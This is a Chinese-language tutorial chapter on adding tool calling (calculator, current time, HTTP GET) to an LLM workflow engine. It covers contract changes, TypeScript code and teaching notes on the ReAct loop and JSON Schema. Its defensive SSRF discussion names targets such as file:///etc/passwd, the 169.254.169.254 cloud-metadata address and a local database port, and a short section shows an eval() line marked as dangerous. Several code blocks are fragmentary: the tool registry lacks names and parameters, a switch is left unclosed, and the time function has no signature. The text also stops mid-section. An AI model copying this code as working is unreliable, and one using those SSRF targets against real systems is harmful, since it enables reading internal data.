## 0. 阶段 6 的立论：从「会说」到「会做」

阶段 5 的 `llm` 节点是这样工作的：

```
messages（system + user） ──▶ ChatOpenAI ──▶ token* ──▶ node_finished { text, model, usage? }
```

模型只会**输出文本**。你问它「今天上海天气」，它只能凭训练数据猜；你让它算 `2+3*4`，它可能算错；你让它读一个网页，它**根本做不到**——它没有网络、没有文件系统、没有计算器，它只有一个 `next-token` 预测器。

阶段 6 换一个问题：**能不能让模型「动手」？**

答案不是「让模型执行代码」（那是灾难），而是让它**说出它想做什么**：

```
模型：我想调用 calculator，参数是 {"expression":"2+3*4"}
你的程序：好，我来执行 → 得到 "14"
你的程序：把 "14" 作为工具结果再发给模型
模型：根据 14 继续回答……
```

这条「**模型出意图 → 程序执行 → 结果回灌**」的链路，就是 **Function Calling / Tool Calling**。它的全部安全性都建立在一条分工上：

> **模型只出意图，程序负责执行。**

记住这句话，本篇后面每一个安全设计（禁用 `eval`、URL 协议白名单、错误分类）都是它的推论。

**阶段 6 不加新节点类型**。工具只是已有 `llm` 节点上的一个配置项 `data.tools`；执行时用「LLM 节点 + 工具节点 + 条件边 + 环」在**节点内部**跑若干轮（契约见 `sse-events.md` §3.1），图的类型仍是 `start` / `end` / `llm` 三种。**保留三种节点、把复杂度收进节点内部**，是为了不让画布与图校验被「循环」污染——这是阶段 4「节点 = 纯函数」思路的延续。

**一次带工具的调用长这样**（全景，细节见后续篇）：

```
POST /apps/{id}/run
  start( node_started / node_finished )
  llm  node_started(llm)                       ← 整个节点只发一次
         token*                                ← 模型流式文本（可以是空）
         tool_call(round 1)  { toolName, args } ← 模型说「我想调用 calculator」
         tool_result(round 1){ result: "14" }  ← 你的程序执行完回灌
         token*                                ← 再问模型，模型给出最终文本
       node_finished(llm)                      ← 只在最后一轮（无 tool_calls）发一次
  end
  run_finished
```

**关键点**：`tool_call` 的 `args` 是**模型给的**，不是用户直接给的；`tool_result` 的 `result` 是**你的程序算出来的**，一律为字符串。这两件事的分界线就是本篇的安全边界。

### 5.1 `paths` 新增 `/tools`

```yaml
  /tools:
    get:
      operationId: listTools
      summary: 列出内置工具定义
      description: >-
        返回引擎可用的内置工具（`name` / `description` / `parameters`）。
        `parameters` 为 JSON Schema 形状，可直接作为 OpenAI function calling 的
        `parameters` 字段。运行前，`llm` 节点的 `tools` 里出现的名字必须都在此列表中。
      security:
        - bearerAuth: []
      responses:
        "200":
          description: 工具列表
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/ToolListResponse"
        "401":
          $ref: "#/components/responses/Unauthorized"
```

**这段在干什么**

1. `operationId: listTools` 是接口的机器名（OpenAPI 惯例，与阶段 0 的 `getHealth` 一致）。
2. `security: - bearerAuth: []` 声明**必须带 Bearer 令牌**——没登录的人不该看到能力目录，401 复用已有的 `Unauthorized` 响应组件。
3. 响应直接 `$ref` 到 `ToolListResponse`，与 `GET /apps` 的 `{ items: [...] }` 是**同一种列表信封**（阶段 2 已定）。
4. `description` 写清两件事：`parameters` 是 **JSON Schema**，可直接喂给 OpenAI 的 function calling；运行前会按这份列表**校验** `llm.data.tools`。这两句就是本篇后面 §18 / §23 的契约依据。

### 5.2 `components.schemas.LlmNodeData` 新增 `tools`

```yaml
    LlmNodeData:
      type: object
      additionalProperties: true
      required: [title, model, prompt]
      description: >-
        `llm` 节点的 `data` 形状（引擎按此解释，见 error-messages.md §4）。
        `model` 为空字符串时回退到环境变量 `LLM_MODEL`。
      properties:
        title:
          type: string
        model:
          type: string
        prompt:
          type: string
          description: 支持 `{{ path }}` 模板
        system:
          type: string
          description: 可选的 system 消息
        temperature:
          type: number
        maxTokens:
          type: integer
        tools:
          type: array
          description: >-
            启用的工具名列表（来自 `GET /tools`）。为空或未设置时不启用工具，
            节点行为与阶段 5 完全一致。启用后引擎用「LLM 节点 + 工具 + 条件边 + 环」
            实现 ReAct 循环，不新增节点类型。
          items:
            type: string
```

**这段在干什么**

1. `tools` 是**可选字段**（不在 `required` 里）：不填就是阶段 5 的老行为，**向后兼容**。
2. 类型是 `array` + `items: string`：存的是**工具名**，不是工具定义。定义只在 `GET /tools` 一处，图数据里只引用名字——这样工具的 `description` 可以改，而不用重写每张图。
3. description 明确「为空或未设置时不启用工具」——这是**默认关闭**（least privilege），不是默认全开。
4. description 还预告了实现方式（条件边 + 环、不新增节点类型），让读者知道「工具调用不是一种新节点」。

### 5.3 `components.schemas` 新增 `ToolDefinition` / `ToolListResponse`

```yaml
    ToolDefinition:
      type: object
      additionalProperties: false
      required: [name, description, parameters]
      properties:
        name:
          type: string
        description:
          type: string
        parameters:
          type: object
          description: JSON Schema 形状（作为 OpenAI function calling 的 `parameters`）
          additionalProperties: true

    ToolListResponse:
      type: object
      additionalProperties: false
      required: [items]
      properties:
        items:
          type: array
          items:
            $ref: "#/components/schemas/ToolDefinition"
```

**这段在干什么**

1. `ToolDefinition` 的 `required` 恰好是**三要素** `name` / `description` / `parameters`——缺一不可，因为模型要靠这三样决定「用不用、怎么用」（见 §16）。
2. `ToolDefinition` 本身 `additionalProperties: false`：工具的**元信息**是封闭的（不允许乱塞字段）；但 `parameters` 内部 `additionalProperties: true`，因为 JSON Schema 的合法关键字很多（`anyOf` / `format` / `minimum`…），不能穷举。
3. `parameters` 声明为 `type: object` 而不是 `string`：它是**结构化的 JSON Schema 对象**，会原样进入发给 provider 的请求体，**不是**一段字符串化的 JSON。
4. `ToolListResponse` 沿用 `{ items }` 信封，与 `AppListResponse` 一致。

### 5.4 `RunEvent.event` 的枚举加两个事件

```yaml
    RunEvent:
      type: object
      # 仅用于**文档**：SSE 流不是 JSON 响应体，每个事件的真实帧格式见
      # packages/contract/sse-events.md。此处描述事件的种类与 payload 形状。
      additionalProperties: false
      required: [event, data]
      properties:
        event:
          type: string
          enum:
            [run_started, node_started, token, tool_call, tool_result, node_finished, run_finished, run_failed]
          description: 事件名
        data:
          type: object
          additionalProperties: true
          description: 事件 payload（键集合见 packages/contract/sse-events.md）
```

**这段在干什么**

1. 事件从 **6 种变 8 种**：在 `token` 之后插入 `tool_call` / `tool_result`。位置有意义——它们发生在 `llm` 节点内部、`node_finished` 之前。
2. `event` 的 enum 只是**文档约束**（真实帧格式以 `sse-events.md` 为唯一真源）；`data` 仍 `additionalProperties: true`，因为不同事件的 payload 键不同。
3. 加事件**不改帧格式**：仍是 `event: <name>\n` + `data: <单行 JSON>\n\n`。前端已有的 SSE 解析器**不用改**，只是多认识两个事件名。

  title: string

### 7.3 新增 §3.1「工具调用（ReAct 循环）的事件顺序」

````markdown
### 3.1 工具调用（ReAct 循环）的事件顺序

`llm` 节点的 `data.tools` 非空时，该节点内部用「LLM + 工具 + 条件边 + 环」执行若干轮
（**不新增节点类型**）。事件顺序固定为：

```
node_started(llm)          ← 只发一次
  token*                   ← 本轮模型流式文本
  tool_call(round 1)       ← 同一轮的多个工具调用可连续出现
  tool_result(round 1)     ← 与 tool_call 按调用顺序一一对应
  token*
  tool_call(round 2)
  tool_result(round 2)
  …
  token*                   ← 最后一轮无 tool_calls 的文本
node_finished(llm)         ← 只在最后一轮（无 tool_calls）发一次
```

- `round` 从 **1** 开始，表示第几轮工具调用；并行工具调用属于**同一 round**。
- `tool_result.result` **一律为字符串**：工具返回值序列化为字符串（紧凑 JSON，不转义非 ASCII）。
- 工具轮次发生在节点内部，**不重复**发 `node_started` / `node_finished`。
- 若某轮工具执行失败，发 `run_failed`（`nodeId` 为该 `llm` 节点），**不**发 `node_finished`。
````

**这段在干什么**

1. 把「一轮」的边界写死：`tool_call` 与 `tool_result` **按调用顺序一一对应**，同一轮的多个调用可以连续出现（并行工具调用）。
2. 明确 `round` **从 1 开始**——很多协议从 0 开始，这里定死是为了两端逐字节一致。
3. `node_started` / `node_finished` **各只发一次**：从外部看，这个 `llm` 节点仍然只执行了一次，符合阶段 4 的事件顺序契约。
4. 失败时**不发** `node_finished`，直接 `run_failed`——与阶段 5 的 LLM 错误处理同一条规矩（出错的节点没有「完成」）。

### 7.4 §4「引擎语义」新增工具段

````markdown
  - **工具**：`data.tools` 非空时，以 `client.bindTools(...)` 把工具定义交给模型；模型返回
    `tool_calls` 时执行工具（见 §3.1），把结果作为 `ToolMessage` 追加回该节点的消息数组，
    再回到本节点继续下一轮。同一 `llm` 节点的多轮共享同一份消息数组，不同 `llm` 节点互不干扰。
    - 工具轮次上限为 `MAX_TOOL_ROUNDS`（默认 5，可由环境变量覆盖）；超过则 `run_failed`
      `tool call rounds exceeded: {max}`。
    - 工具失败文案见 `error-messages.md` §6。
    - 该节点的 `node_finished.output` 仍为 `{ "text": string, "model": string, "usage"?: object }`，
      `text` 为**最后一轮**（无 tool_calls 的那轮）的文本。
````

**这段在干什么**

1. 说明「工具定义怎么交给模型」：`bindTools`（LangChain 的能力，见后续篇），而不是自己拼 HTTP。
2. 「**消息数组**」是关键：多轮 ReAct 共享同一份 `messages`，每轮把 `assistant(tool_calls)` 与 `tool(ToolMessage)` 追加进去；不同 `llm` 节点各有一份，**互不干扰**。
3. **必须有上限**：`MAX_TOOL_ROUNDS` 默认 5。模型可能一直调用工具（循环），没有上限就是死循环 + 烧钱。
4. `node_finished.output` **形状不变**：仍是 `{ text, model, usage? }`，`text` 只取最后一轮。这意味着**前端不用改渲染逻辑**——工具轮次的中间文本通过 `token` 事件已经发过了。

 * `TOOL_DEFINITIONS[].parameters` 是 JSON Schema 形状，可直接作为 OpenAI
 * function calling 的 `parameters` 交给模型；`executeTool` 按名字分派执行。
 * 返回值一律为**字符串**（与 `tool_result.result` 的契约一致）。

export const TOOL_DEFINITIONS: ToolDefinition[] = [
  {

    description: '安全地计算一个四则运算表达式，支持 + - * /、括号、小数与一元负号。',

      type: 'object',

  },

export function getToolDefinition(name: string): ToolDefinition | undefined {
  return TOOL_DEFINITIONS.find((definition) => definition.name === name)
}

/**
 * 执行一个工具，返回**字符串**结果。
 *
 * 未注册的工具名由引擎在预检阶段拦截；此处再抛普通 Error 作为兜底。
 * 工具内部失败一律抛 `ToolError`（带固定 `reason`），由引擎拼成规范文案。
 */
export async function executeTool(name: string, args: Record<string, unknown>): Promise<string> {
  switch (name) {
    case 'calculator':
      return runCalculator(args)
    case 'get_current_time':
      return runGetCurrentTime()
    case 'http_get':
      return runHttpGet(args)
    default:
      throw new Error(`unknown tool: ${name}`)

**这段在干什么（按执行顺序）**

1. **静态定义**：`TOOL_DEFINITIONS` 是一个常量数组，模块加载时就存在。它同时服务三处——`GET /tools` 的响应、预检的 `hasTool`、执行时的 `executeTool`。**一处定义，三处使用**，这是「能力目录」与「执行」不脱节的根。
2. **`description` 是自然语言**：直接写给人读的句子，但**真正的读者是模型**（§16）。它必须说清「做什么、有什么限制」。
3. **`parameters` 是 JSON Schema**：`type: 'object'` + `properties` + `required` + `additionalProperties: false`。它不是 TS 类型，而是**一个可以被 `JSON.stringify` 进请求体的对象**。
4. **`hasTool`**：预检用。O(n) 遍历没问题——工具总数是几十个的量级。
5. **`getToolDefinition`**：给需要「拿到完整定义」的调用方（如 `bindTools`）用；本篇的 `/tools` 控制器直接返回整个数组。
6. **`executeTool`**：`switch` 按名字分派。`default` 抛普通 `Error` 是**兜底**——正常路径下引擎预检已拦截未知工具，这里只是防御性编程。
7. **统一返回 `Promise<string>`**：即使 `calculator` 是同步的，也包在 `async` 函数里，让调用方只有一种等待方式；返回值**一律字符串**，与 `tool_result.result` 契约一致。

## 10. 完整代码：`calculator`（递归下降解析器）

**完整文件路径：`apps/api-ts/src/tools/calculator.tool.ts`**

```ts
import { ToolError } from './tool-error'

/**
 * `calculator`：对 `{ expression: string }` 做**安全**四则运算求值。
 *
 * 不使用 `eval` / `Function`，而是手写一个最小递归下降解析器：
 * 支持 `+ - * /`、括号、小数与一元正负号。语法或数值非法（如 `2+`、除零）
 * 一律抛 `ToolError('invalid arguments')`。
 */
export function runCalculator(args: Record<string, unknown>): string {
  const expression = args.expression
  if (typeof expression !== 'string' || expression.trim() === '') {
    throw new ToolError('invalid arguments')
  }
  const value = new ExpressionParser(expression).parse()
  if (!Number.isFinite(value)) {
    throw new ToolError('invalid arguments')
  }
  return formatNumber(value)
}

/** 数值字符串化：消除浮点噪声（如 0.1+0.2 → "0.3"），并把 -0 归一为 "0"。 */
function formatNumber(value: number): string {
  if (value === 0) {
    return '0'
  }
  const normalized = Number(value.toPrecision(12))
  return String(normalized)
}

/** 最小表达式解析器（递归下降）：expression := term (('+'|'-') term)*。 */
class ExpressionParser {
  private position = 0

  constructor(private readonly input: string) {}

  parse(): number {
    const value = this.parseExpression()
    this.skipSpaces()
    if (this.position < this.input.length) {
      throw new ToolError('invalid arguments')
    }
    return value
  }

  private parseExpression(): number {
    let value = this.parseTerm()
    for (;;) {
      this.skipSpaces()
      const char = this.input[this.position]
      if (char === '+') {
        this.position += 1
        value += this.parseTerm()
      } else if (char === '-') {
        this.position += 1
        value -= this.parseTerm()
      } else {
        return value
      }
    }
  }

  private parseTerm(): number {
    let value = this.parseUnary()
    for (;;) {
      this.skipSpaces()
      const char = this.input[this.position]
      if (char === '*') {
        this.position += 1
        value *= this.parseUnary()
      } else if (char === '/') {
        this.position += 1
        const divisor = this.parseUnary()
        if (divisor === 0) {
          throw new ToolError('invalid arguments')
        }
        value /= divisor
      } else {
        return value
      }
    }
  }

  private parseUnary(): number {
    this.skipSpaces()
    const char = this.input[this.position]
    if (char === '+') {
      this.position += 1
      return this.parseUnary()
    }
    if (char === '-') {
      this.position += 1
      return -this.parseUnary()
    }
    return this.parsePrimary()
  }

  private parsePrimary(): number {
    this.skipSpaces()
    if (this.input[this.position] === '(') {
      this.position += 1
      const value = this.parseExpression()
      this.skipSpaces()
      if (this.input[this.position] !== ')') {
        throw new ToolError('invalid arguments')
      }
      this.position += 1
      return value
    }
    return this.parseNumber()
  }

  private parseNumber(): number {
    const start = this.position
    let seenDot = false
    while (this.position < this.input.length) {
      const char = this.input[this.position]
      if (char >= '0' && char <= '9') {
        this.position += 1
      } else if (char === '.' && !seenDot) {
        seenDot = true
        this.position += 1
      } else {
        break
      }
    }
    const text = this.input.slice(start, this.position)
    if (text === '' || text === '.') {
      throw new ToolError('invalid arguments')
    }
    const value = Number(text)
    if (!Number.isFinite(value)) {
      throw new ToolError('invalid arguments')
    }
    return value
  }

  private skipSpaces(): void {
    while (this.position < this.input.length && /\s/.test(this.input[this.position])) {
      this.position += 1
    }
  }
}
```

**这段在干什么（按执行顺序）**

1. **入口校验**（`runCalculator`）：`expression` 必须是字符串且非空。模型可能传 `null`、数字、对象——一律 `invalid arguments`，不尝试「猜」。
2. **解析**：`new ExpressionParser(expr).parse()`。`position` 是一个游标，所有 `parseXxx` 都是「从当前位置吃掉一段、返回它的值」。
3. **整体收尾**：`parse()` 在表达式解析完后 `skipSpaces()`，若游标**还没到结尾**，说明有无法识别的字符（如 `2+3abc`）→ `invalid arguments`。这一步是「白名单语法」的关键（§19）。
4. **数值兜底**：`Number.isFinite(value)` 拦住 `Infinity` / `NaN`（虽然除零已单独拦，双保险）。
5. **格式化**：`formatNumber` 用 `toPrecision(12)` 消掉 `0.1+0.2 = 0.30000000000000004` 这类浮点噪声；`-0` 归一成 `"0"`，让两端输出字符串一致。
6. **递归下降的四个层级**：`parseExpression`（`+ -`）→ `parseTerm`（`* /`）→ `parseUnary`（一元 `+ -`）→ `parsePrimary`（括号 / 数字）。**调用层级就是优先级**：先调用的层级优先级更低。详细走查见 §19.3。

## 11. 完整代码：`get_current_time`

**完整文件路径：`apps/api-ts/src/tools/current-time.tool.ts`**

```ts
/**
 * `get_current_time`：无参数，返回当前 UTC 时间。
 *
 * 格式与全站一致：ISO-8601、毫秒精度、以 `Z` 结尾（固定 24 字符）。

  return new Date().toISOString()
}
```

**这段在干什么**

1. **不读 `args`**：这是一个**无参数工具**。模型不需要（也不应该）告诉工具「现在几点」——时间是客观事实，由运行环境提供。
2. `new Date().toISOString()` 固定输出形如 `2026-10-20T08:12:34.567Z` 的 **24 字符**字符串：UTC、毫秒精度、以 `Z` 结尾。
3. 这与阶段 2 的 `iso_z()`（Python 侧）、阶段 0 的 `/health.time` 是**同一个时间规范**——全站只有一种时间戳形状。

## 12. 完整代码：`http_get`（SSRF 首道防线）

**完整文件路径：`apps/api-ts/src/tools/http-get.tool.ts`**

```ts
import { ToolError } from './tool-error'

/** 响应体上限：64KB（见契约 §6.2 的 `too large`）。 */
const MAX_BODY_BYTES = 64 * 1024

/** 超时：5 秒（见契约 §6.2 的 `timeout`）。 */
const TIMEOUT_MS = 5000

/**
 * `http_get`：对 `{ url: string }` 发起 GET，返回响应体文本。
 *
 * 安全约束：
 * - 仅允许 `http:` / `https:` 协议，否则 `not allowed`；
 * - 5s 超时 → `timeout`；
 * - 响应体超过 64KB → `too large`（读取过程中即中止，不把大响应读进内存）；
 * - 其它异常 → `error`。
 */
export async function runHttpGet(args: Record<string, unknown>): Promise<string> {
  const url = args.url
  if (typeof url !== 'string' || url === '') {
    throw new ToolError('invalid arguments')
  }
  let target: URL
  try {
    target = new URL(url)
  } catch {
    throw new ToolError('invalid arguments')
  }
  if (target.protocol !== 'http:' && target.protocol !== 'https:') {
    throw new ToolError('not allowed')
  }

  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), TIMEOUT_MS)
  try {
    const response = await fetch(target, { signal: controller.signal })
    if (response.body === null) {
      return ''
    }
    const reader = response.body.getReader()
    const chunks: Uint8Array[] = []
    let total = 0
    for (;;) {
      const { done, value } = await reader.read()
      if (done) {
        break
      }
      total += value.byteLength
      if (total > MAX_BODY_BYTES) {
        await reader.cancel()
        throw new ToolError('too large')
      }
      chunks.push(value)
    }
    return new TextDecoder().decode(concatBytes(chunks, total))
  } catch (error) {
    if (error instanceof ToolError) {
      throw error
    }
    if (isAbortError(error)) {
      throw new ToolError('timeout')
    }
    throw new ToolError('error')
  } finally {
    clearTimeout(timer)
  }
}

function concatBytes(chunks: Uint8Array[], total: number): Uint8Array {
  const merged = new Uint8Array(total)
  let offset = 0
  for (const chunk of chunks) {
    merged.set(chunk, offset)
    offset += chunk.byteLength
  }
  return merged
}

function isAbortError(error: unknown): boolean {
  return typeof error === 'object' && error !== null && (error as { name?: unknown }).name === 'AbortError'
}
```

**这段在干什么（按执行顺序）**

1. **参数校验**：`url` 必须是非空字符串，否则 `invalid arguments`。
2. **URL 解析**：`new URL(url)` 失败（如 `"not a url"`）→ `invalid arguments`。注意：**能解析**不等于**允许**。
3. **协议白名单**：只有 `http:` / `https:` 放行；`file:` / `ftp:` / `data:` …→ `not allowed`。这一步拦住了 `file:///etc/passwd` 这类本地文件读取。
4. **超时控制**：`AbortController` + `setTimeout(5000)`。超时触发 `controller.abort()`，`fetch` 抛 `AbortError`。
5. **流式读取 + 体积上限**：用 `response.body.getReader()` **边读边计数**；超过 64KB 立即 `reader.cancel()` 并抛 `too large`。**不在读完之后才判断**——否则一个 1GB 的响应会先把内存吃掉。
6. **解码**：`TextDecoder`（默认 UTF-8）把字节拼起来转成字符串。
7. **错误归一**：`ToolError` 原样抛（保留 `too large` 等）；`AbortError` → `timeout`；其余（DNS 失败、连接被拒、HTTP 解析错）→ `error`。
8. **`finally clearTimeout`**：无论成功失败都清掉定时器，避免定时器残留。

> **诚实的安全边界**：这一步只做了「**协议白名单**」。它**不能**阻止 `http://169.254.169.254/...`（云元数据）、`http://127.0.0.1:5432`（内网端口）或**重定向**到内网地址。完整的 SSRF 防护需要 DNS 解析 + IP 段黑白名单 + 出网代理/防火墙。教学项目把它作为**第一道防线**，并把「目标不被允许」写进 `not allowed` 的语义里，为将来加 IP 校验留位置（见 §20.4）。

## 13. 完整代码：工具错误类型

**完整文件路径：`apps/api-ts/src/tools/tool-error.ts`**

```ts
/**
 * 工具执行失败（见 error-messages.md §6.2）。
 *
 * `reason` 只能取契约规定的固定值；引擎据此拼出
 * `tool {name} failed: {reason}`，两端逐字节一致。
 */
export type ToolFailureReason =
  | 'invalid arguments'
  | 'timeout'
  | 'not allowed'
  | 'too large'
  | 'error'

export class ToolError extends Error {
  constructor(readonly reason: ToolFailureReason) {
    super(reason)
  }
}
```

**这段在干什么**

1. **类型即白名单**：`ToolFailureReason` 是**字面量联合**，写错一个词编译不过。这比「随便抛 `new Error('oops')`」强得多。
2. `ToolError` 只带 `reason`，**不带原始错误信息**：原始信息可能包含库名、路径、内部 IP，两端也无法逐字节一致（见 §22.2）。
3. `super(reason)` 让 `error.message` 与 `reason` 相同，便于本地调试；但**契约文案由引擎拼**（`tool {name} failed: {reason}`），不是工具自己拼。

## 15. 【技术教学 · 首次】Function Calling / Tool Calling：模型只出意图

### 15.1 模型到底能做什么

一个 LLM 在推理时只能做一件事：**根据已有 token 预测下一个 token**。它没有执行环境——不能读文件、不能发 HTTP、不能跑 `eval`。所谓「让模型用工具」，本质是：

> 让模型**输出一段结构化的文本**，说「我想调用 `calculator`，参数是 `{"expression":"2+3*4"}`」；
> **你的程序**读懂这段文本，执行真正的函数，再把结果作为新一轮输入发给它。

所以 Function Calling **不是**「模型执行函数」，而是「模型**申请**执行函数」。这是初学者最大的误解。

### 15.2 一次工具调用的完整往返

```
① 你 ──(messages + tools 定义)──────────────────────────▶ LLM
                                                          │
②                        ◀── assistant 消息里带 tool_calls ┘
   { "tool_calls": [ { "id":"call_1", "type":"function",
                       "function": { "name":"calculator",
                                     "arguments":"{\"expression\":\"2+3*4\"}" } } ] }

③ 你的程序：解析 arguments → 校验 → 执行 calculator → "14"

④ 你 ──(messages + assistant(tool_calls) + tool 消息)────▶ LLM
   { "role":"tool", "tool_call_id":"call_1", "content":"14" }

⑤                        ◀── 最终文本（或又一轮 tool_calls）┘
   "2+3*4 等于 14。"
```

这就是一个 **ReAct 循环**：**Re**ason（模型决定要不要调工具）→ **Act**（程序执行）→ **O**bserve（结果回灌）→ 再 Reason。

### 15.3 三个角色的分工

| 角色 | 负责什么 | 不负责什么 |
| --- | --- | --- |
| **模型** | 决定「用不用工具、用哪个、参数填什么」；根据工具结果继续回答 | **不执行**任何代码；**不校验**参数合法性；不保证参数一定对 |
| **你的程序** | 提供工具定义（`tools`）；解析/校验参数；**执行**；把结果回灌；限制轮次 | 不替模型「猜意图」；不信任模型给的参数 |
| **契约** | 定义工具的名字、描述、参数 schema、事件、错误文案 | 不规定实现细节（用什么库、怎么写解析器） |

一句话：

> **模型负责「想」，程序负责「做」，契约负责「说清楚」。**

### 15.4 四个必须记住的实现细节

1. **`arguments` 是字符串，不是对象**（OpenAI 方言）。它常常是**分片流式**到达的（`delta.tool_calls[].function.arguments`），需要按 `index` 拼接后再 `JSON.parse`。**解析失败是常态**（模型会写出非法 JSON），必须归到 `invalid arguments`。
2. **`id` 必须原样回传**。`tool_call_id` 是配对的钥匙；回灌时丢了或改了，provider 会报错。
3. **模型可以并行调用多个工具**（同一轮多个 `tool_calls`）。所以契约里 `round` 表示「轮」，不是「调用序号」。
4. **模型会编造**：不存在的工具名、多余参数、类型不对的值。**所有参数都当不可信输入处理**——这正是本篇安全设计的出发点。

### 15.5 为什么本项目要「工具名 + 注册表」而不是把函数直接塞给模型

- 模型**看不到你的函数体**，只能看到 `name` / `description` / `parameters`（§16）。
- 图数据里只存**工具名**（`data.tools: string[]`），执行时按名字查注册表。这样**工具实现可以换、描述可以改，而图不用动**；预检也能在**运行前**用同一份注册表判断「名字是否存在」。
- 这也让「前端勾选列表」有了稳定来源：`GET /tools`。

## 16. 【技术教学 · 首次】`ToolDefinition` 三要素：`description` 是写给模型看的

### 16.1 三要素各自的作用

| 字段 | 类型 | **谁在读** | 作用 |
| --- | --- | --- | --- |
| `name` | string | **模型 + 程序** | 模型回传它，程序按它分派。机器标识，稳定、短、`snake_case` |
| `description` | string | **模型**（以及前端展示） | 模型**靠它决定用不用这个工具**。它是「提示词」，不是「人类文档」 |
| `parameters` | JSON Schema object | **模型 + 程序** | 模型靠它知道「该填哪些参数」；程序靠它（或手写校验）判断参数合法性 |

### 16.2 `description` 的真实读者是模型

看本项目三条描述：

```
calculator        ：安全地计算一个四则运算表达式，支持 + - * /、括号、小数与一元负号。
get_current_time   ：返回当前 UTC 时间（ISO-8601、毫秒精度、以 Z 结尾）。无参数。
http_get           ：对给定 URL 发起 HTTP GET，返回响应体文本。仅允许 http/https。
```

它们都不是「给同事看的 API 文档」，而是**模型选工具时的唯一依据**。因此写描述有三条硬要求：

| 要求 | 反例 | 本项目的正确写法 |
| --- | --- | --- |
| **说清能力边界** | 「计算东西」 | 「支持 + - * /、括号、小数与一元负号」——模型知道 `%` / `^` 不在能力内 |
| **说清限制** | 「发 HTTP 请求」 | 「**仅允许 http/https**」——既是提示，也与代码里的白名单一致 |
| **说清输出/典型用法** | 「返回时间」 | 「返回当前 **UTC** 时间（ISO-8601、毫秒精度、以 Z 结尾）」——模型能正确转述格式 |

**为什么这很关键**：模型选工具靠的是语义匹配。两个工具描述都写「处理数据」，模型就会乱选；描述写得越像「**什么时候该用我**」，选错的概率越低。这也是为什么 `description` 通常比 `name` 长得多。

> 对照：在 Nginx 里改 `description` 什么都不影响；在这里改 `description` 会**直接改变模型行为**。把工具描述当成**产品逻辑**来维护，而不是注释。

### 16.3 为什么 `parameters.additionalProperties: false`

三个工具的参数都写了 `additionalProperties: false`：

- 对模型：明确「**不要**加别的字段」；
- 对程序：本项目用手写校验（`typeof` / 非空），所以这条主要是**提示模型**；
- 对前端：如果将来做「工具参数表单」，可以直接据此只渲染声明的字段。

但**它不构成强制**：非 `strict` 模式下 provider 不会因为 schema 就拒绝多出来的字段，模型也可能无视。**真正的强制在代码里**（`runCalculator` 检查 `typeof`）。§17 会讲这个区别。

## 17. 【技术教学 · 首次】JSON Schema 作为「给模型的函数签名」

### 17.1 JSON Schema 是什么

**JSON Schema 是「用 JSON 描述 JSON 文档形状」的一份规范**。它不是代码，是一份**数据**：

```json
{
  "type": "object",
  "properties": {
    "expression": { "type": "string", "description": "要计算的表达式，例如 \"2+3*4\"" }
  },
  "required": ["expression"],
  "additionalProperties": false
}
```

常用关键字（本项目用到的）：

| 关键字 | 含义 |
| --- | --- |
| `type` | 值的类型（`object` / `string` / `number` / `integer` / `array` / `boolean`） |
| `properties` | 对象各字段的子 schema |
| `required` | 必填字段名数组 |
| `additionalProperties` | 是否允许未声明的字段 |
| `description` | **给读者（这里是模型）的说明** |

### 17.2 三种「类型描述」，三种「读者」

这是本篇最需要建立的心智模型：

| | TS `interface` | Pydantic `BaseModel` | **工具的 JSON Schema** |
| --- | --- | --- | --- |
| **谁在读** | **编译器**（`tsc`） | **Python 运行期** | **LLM**（以及可选的校验器） |
| **何时消失** | 编译后**完全擦除**（类型擦除） | 运行期一直存在 | 一直存在（它就是数据） |
| **能跨进程/跨语言传吗** | 不能（擦除后没有形状） | 不能直接传（Python 对象） | **能**（就是一段 JSON） |
| **能强制约束吗** | 编译期约束你 | **运行期强制校验** | **不能**——模型和 provider 都可能无视 |
| **本项目用它在哪** | 代码内部类型安全 | FastAPI 的请求体校验 | 发给 LLM 的 `tools[].function.parameters` |

**为什么 OpenAI 用 JSON Schema 而不是「某种 IDL」**：因为 request body 本身就是 JSON，塞一段 JSON 最自然、跨语言、跨厂商。TS 类型编译后就没了（阶段 0 讲过的**类型擦除**），Python 的 Pydantic 对象也不能直接塞进 JSON 请求——但 `BaseModel.model_json_schema()` 可以导出 JSON Schema。**JSON Schema 是三方（TS 实现、Python 实现、LLM）唯一都能读的「共同语言」**。

### 17.3 「给模型读」与「给校验器读」是两件事

同一份 schema，可以有两个用途：

1. **提示模型**：告诉它字段名、类型、说明。模型**大概率**照做，但**不保证**。
2. **校验参数**：用 JSON Schema 校验器（如 `ajv`）对模型给的实际参数做运行期校验。

本项目**没有引入校验库**，而是在工具函数里**手写最小校验**：

```ts
if (typeof expression !== 'string' || expression.trim() === '') {
  throw new ToolError('invalid arguments')
}
```

这样做的理由：

- 校验规则极简（一个字符串字段），引入 `ajv` 是过度设计；
- **两端要逐字节一致**，手写 `typeof` 在 TS / Python 里语义明确，不会因为两个校验库的方言差异产生不同错误；
- **JSON Schema 本身不是安全边界**。真正的安全在工具实现里（§19、§20）。

> 一句口诀：**Schema 是给模型的「说明书」，不是给运行期的「防盗门」。** 说明书可能被无视，防盗门必须自己装。

| **后端执行** | `bindTools` 需要完整定义（不是只有名字） |
| **人** | 调试时一眼看清「这一版到底有哪些工具」 |

**关键设计：目录与执行共用一份注册表**：

```
TOOL_DEFINITIONS（apps/api-ts/src/tools/registry.ts）
      ├──▶ GET /tools 的响应（前端看到什么）
      ├──▶ hasTool() 预检（后端允许什么）
      └──▶ executeTool() 分派（真正执行什么）
```

如果三处各写一份列表，必然漂移：前端列出 `web_search`，后端却没有；或预检放行、执行时 `default` 抛错。**一份常量、三处引用**是唯一不会漂移的做法。

### 18.3 为什么是「接口」而不是「前端常量」

- 工具是**后端能力**，不是产品文案。新增一个工具应该**只改后端**，前端刷新就能看到。
- 工具定义是**同一份 JSON Schema**，前端拿到的和模型拿到的**完全相同**——不会出现「前端说有两个参数、模型只收到一个」。
- 两台后端（NestJS / FastAPI）返回**逐字段相等**的 JSON，这是本项目「同一契约、两套实现」的又一次兑现。

### 18.4 为什么需要鉴权

`/tools` 不是公开的元信息接口。它属于**已登录用户的产品界面**：

- 未登录 → 401 `{"statusCode":401,"message":"Missing bearer token","error":"Unauthorized"}`；
- 与 `/apps`、`/auth/me` 一样，统一走 `JwtAuthGuard` / `get_current_user`。

> **实测**：TS 与 Python 的 `GET /tools` 返回的 JSON **逐字段相等**（3 个定义的 `name` / `description` / `parameters` 全部一致）。

## 19. 【技术教学 · 首次】`calculator`：为什么绝不能用 `eval`

### 19.1 危险在哪里

最省事的写法是：

```ts
// 绝对不要这样写
return String(eval(expression))
```

